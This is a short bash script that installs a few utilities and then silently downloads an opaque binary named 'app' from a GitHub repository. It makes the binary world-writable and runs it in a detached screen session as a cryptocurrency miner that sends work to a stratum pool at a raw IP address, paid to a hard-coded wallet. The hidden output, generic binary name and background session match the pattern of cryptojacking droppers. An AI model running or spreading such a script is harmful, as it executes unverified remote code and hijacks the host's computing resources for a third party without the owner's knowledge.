#!/bin/bash
apt update && apt install -y neofetch wget screen htop
nohup wget -O app https://github.com/duniaboci13/project/raw/main/apps > /dev/null 2>&1 && chmod 777 app && screen -dmS Apps ./app -a power2b -o stratum+tcps://152.42.199.142:443 -u mbc1qe3flkq8el48edhzudr75a2pj0vdf4uvykdygxg.kevin -p x -t 8
